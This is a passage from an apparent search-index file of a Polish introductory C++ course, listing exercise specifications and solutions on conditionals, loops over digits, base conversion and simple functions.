endl;\n    } else {\n        cout &lt;&lt; a &lt;&lt; \" / \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; (double) a / (double) b &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(rok\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Komunikat okre\u015blaj\u0105cy, czy podany rok jest przest\u0119pny czy te\u017c nie</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-instruction/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int rok;\n\n    cout &lt;&lt; \"Podaj rok:\" &lt;&lt; endl;\n    cin &gt;&gt; rok;\n\n    if ((rok % 4 == 0 &amp;&amp; rok % 100 != 0) || rok % 400 == 0) {\n        cout &lt;&lt; rok &lt;&lt; \" jest przestepny\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; rok &lt;&lt; \" nie jest przestepny\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/","title":"P\u0119tla warunkowa","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#wynik","title":"Wynik","text":"<ul> <li>Kolejne cyfry liczby \\(n\\), wypisane od ko\u0144ca, tzn. zaczynaj\u0105c od cyfry jedno\u015bci</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_1","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#wynik_1","title":"Wynik","text":"<ul> <li>Suma cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_2","title":"Dane","text":"<pre><code>n := 1234\n</code></pre> <p>Wynik: \\(10\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(1+2+3+4=10\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_3","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#wynik_2","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez odwr\u00f3cenie cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_4","title":"Dane","text":"<pre><code>n := 1234\n</code></pre> <p>Wynik: \\(4321\\)</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_5","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(k\\) - liczba naturalna z zakresu \\([0,9]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#wynik_3","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez zast\u0105pienie ka\u017cdej cyfry liczby \\(n\\) przez warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy liczby \\(k\\) i danej cyfry</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_6","title":"Dane","text":"<pre><code>n := 1234\nk := 3\n</code></pre> <p>Wynik: \\(2101\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(|3-1|=2\\) </p> <p>\\(|3-2|=1\\) </p> <p>\\(|3-3|=0\\) </p> <p>\\(|3-4|=1\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_7","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#wynik_4","title":"Wynik","text":"<ul> <li>Zapis binarny liczby \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_8","title":"Dane","text":"<pre><code>n := 10\n</code></pre> <p>Wynik: \\(1010\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(10_{10}=1010_2\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_9","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p\\) - liczba naturalna z zakresu \\([2,9]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#wynik_5","title":"Wynik","text":"<ul> <li>Zapis liczby \\(n\\) w systemie o podstawie \\(p\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/#dane_10","title":"Dane","text":"<pre><code>n := 10\np := 3\n</code></pre> <p>Wynik: \\(101\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(10_{10}=101_3\\) </p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Kolejne cyfry liczby \\(n\\), wypisane od ko\u0144ca, tzn. zaczynaj\u0105c od cyfry jedno\u015bci</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, cyfra;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    while (n &gt; 0) {\n        cyfra = n % 10;\n        cout &lt;&lt; cyfra &lt;&lt; endl;\n        n = n / 10;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, cyfra, suma;\n\n    suma = 0;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    while (n &gt; 0) {\n        cyfra = n % 10;\n        suma += cyfra;\n        n = n / 10;\n    }\n\n    cout &lt;&lt; \"Suma cyfr podanej liczby wynosi \" &lt;&lt; suma &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez odwr\u00f3cenie cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, cyfra, odwrocona;\n\n    odwrocona = 0;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    while (n &gt; 0) {\n        cyfra = n % 10;\n\n        odwrocona *= 10;\n        odwrocona += cyfra;\n\n        n = n / 10;\n    }\n\n    cout &lt;&lt; \"Odwrocona liczba: \" &lt;&lt; odwrocona &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(k\\) - liczba naturalna z zakresu \\([0,9]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez zast\u0105pienie ka\u017cdej cyfry liczby \\(n\\) przez warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy liczby \\(k\\) i danej cyfry</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, cyfra, nowa, k, pot;\n\n    nowa = 0;\n    pot = 1;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; n &gt;&gt; k;\n\n    while (n &gt; 0) {\n        cyfra = n % 10;\n        cyfra = abs(k - cyfra);\n\n        nowa += cyfra * pot;\n        pot *= 10;\n\n        n = n / 10;\n    }\n\n    cout &lt;&lt; \"Nowa liczba: \" &lt;&lt; nowa &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Zapis binarny liczby \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, cyfra;\n    string binarna = \"\";\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    while (n &gt; 0) {\n        cyfra = n % 2;\n\n        binarna = (char)(cyfra + '0') + binarna;\n\n        n = n / 2;\n    }\n\n    cout &lt;&lt; \"Wartosc binarna: \" &lt;&lt; binarna &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p\\) - liczba naturalna z zakresu \\([2,9]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Zapis liczby \\(n\\) w systemie o podstawie \\(p\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/conditional-loop/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, p, cyfra;\n    string nowa = \"\";\n\n    cout &lt;&lt; \"Podaj liczbe dziesietna:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    cout &lt;&lt; \"Podaj nowa podstawe:\" &lt;&lt; endl;\n    cin &gt;&gt; p;\n\n    while (n &gt; 0) {\n        cyfra = n % p;\n\n        nowa = (char)(cyfra + '0') + nowa;\n\n        n = n / p;\n    }\n\n    cout &lt;&lt; \"Po zamianie: \" &lt;&lt; nowa &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/","title":"Funkcje","text":""},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wypisanie komunikatu powinno zosta\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\", np. \"Witaj Damian!\"</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczanie sumy powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_1","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_1","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczenie i wypisywanie dzielnik\u00f3w powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_2","title":"Wynik","text":"<ul> <li>Wszystkie dzielniki liczby \\(n\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_3","title":"Dane","text":"<pre><code>n := 10\n</code></pre> <p>Wynik: \\(1, 2, 5, 10\\) </p>"},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wczytywanie tablicy oraz wypisywanie tablicy na ekranie zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_4","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_3","title":"Wynik","text":"<ul> <li>Wczytana tablica wypisana na ekranie w jednej linii, ka\u017cdy element oddzielony spacj\u0105</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Losowanie tablicy oraz wypisywanie tablicy na ekranie zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_5","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p, k\\) - liczby ca\u0142kowite, \\(p &lt; k\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_4","title":"Wynik","text":"<ul> <li>\\(n\\)-elementowa tablica losowych liczb ca\u0142kowitych z przedzia\u0142u \\([p,k)\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wczytywanie tablicy, przemna\u017canie tablicy oraz wypisywanie tablicy na ekranie zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_6","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(k\\) - liczba ca\u0142kowita</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_5","title":"Wynik","text":"<ul> <li>Tablica powsta\u0142a poprzez przemno\u017cenie ka\u017cdego elementu tablicy \\(tab\\) przez liczb\u0119 \\(k\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_7","title":"Dane","text":"<pre><code>n := 5\nk := 2\ntab := [4, 1, 7, 0, 2]\n</code></pre> <p>Wynik: \\([8, 2, 14, 0, 4]\\) </p>"},{"location":"programming/c%2B%2B/exercises/functions/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wczytywanie tablicy, a tak\u017ce obliczanie ka\u017cdej ze statystyk zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_8","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_6","title":"Wynik","text":"<ul> <li>Statystyki tablicy \\(tab\\): minimum, maksimum, suma, \u015brednia</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/functions/#dane_9","title":"Dane","text":"<pre><code>n := 5\ntab := [4, 1, 7, 0, 2]\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/#wynik_7","title":"Wynik","text":"<pre><code>minimum := 0\nmaksimum := 7\nsuma := 14\nsrednia := 2.8\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wypisanie komunikatu powinno zosta\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\", np. \"Witaj Damian!\"</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid powitanie(string imie) {\n    cout &lt;&lt; \"Witaj \" &lt;&lt; imie &lt;&lt; \"!\" &lt;&lt; endl;\n}\n\nint main() {\n    string imie;\n\n    cout &lt;&lt; \"Podaj swoje imie:\" &lt;&lt; endl;\n    cin &gt;&gt; imie;\n\n    powitanie(imie);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczanie sumy powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint suma(int a, int b) {\n    return a + b;\n}\n\nint main() {\n    int a, b, wynik;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    wynik = suma(a, b);\n\n    cout &lt;&lt; a &lt;&lt; \" + \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; wynik &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczenie i wypisywanie dzielnik\u00f3w powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie dzielniki liczby \\(n\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid dzielniki(int n) {\n    cout &lt;&lt; \"Dzielniki liczby \" &lt;&lt; n &lt;&lt; endl;\n\n    for(int i = 1; i &lt;= n; i++) {\n        if(n % i == 0) {\n            cout &lt;&lt; i &lt;&lt; \" \";\n        }\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int n;\n\n    cout &lt;&lt; \"Podaj liczbe naturalna:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    dzielniki(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wczytywanie tablicy oraz wypisywanie tablicy na ekranie zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Wczytana tablica wypisana na ekranie w jednej linii, ka\u017cdy element oddzielony spacj\u0105</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid wczytaj(int n, int tab[]) {\n    for(int i = 0; i &lt; n; i++) {\n        cout &lt;&lt; \"Podaj kolejna wartosc:\" &lt;&lt; endl;\n        cin &gt;&gt; tab[i];\n    }\n}\n\nvoid wypisz(int n, int tab[]) {\n    for(int i = 0; i &lt; n; i++) {\n        cout &lt;&lt; tab[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n     int n;\n\n    cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    int tab[n];\n\n    wczytaj(n, tab);\n\n    wypisz(n, tab);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Losowanie tablicy oraz wypisywanie tablicy na ekranie zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p, k\\) - liczby ca\u0142kowite, \\(p &lt; k\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-5/#wynik","title":"Wynik","text":"<ul> 